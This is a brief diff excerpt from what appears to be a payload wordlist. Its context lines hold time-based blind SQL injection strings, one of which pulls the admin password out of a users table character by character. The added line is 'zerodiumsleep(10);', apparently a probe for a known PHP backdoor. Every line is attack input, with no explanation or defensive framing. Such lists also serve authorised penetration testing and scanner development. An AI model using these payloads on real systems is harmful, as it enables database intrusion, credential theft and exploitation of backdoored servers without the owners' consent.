@@ -1013,3 +1013,4 @@ AND sleep(10) AND ('kleiton'='kleiton
 SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'),1,1)='a' THEN dbms_lock.sleep(10) ELSE dbms_lock.sleep(0) END FROM dual
 (SELECT(0)FROM(SELECT(SLEEP(8)))a)
 'XOR(SELECT CASE WHEN(1234=1234) THEN SLEEP(9) ELSE 0 END)XOR'Z
+zerodiumsleep(10);
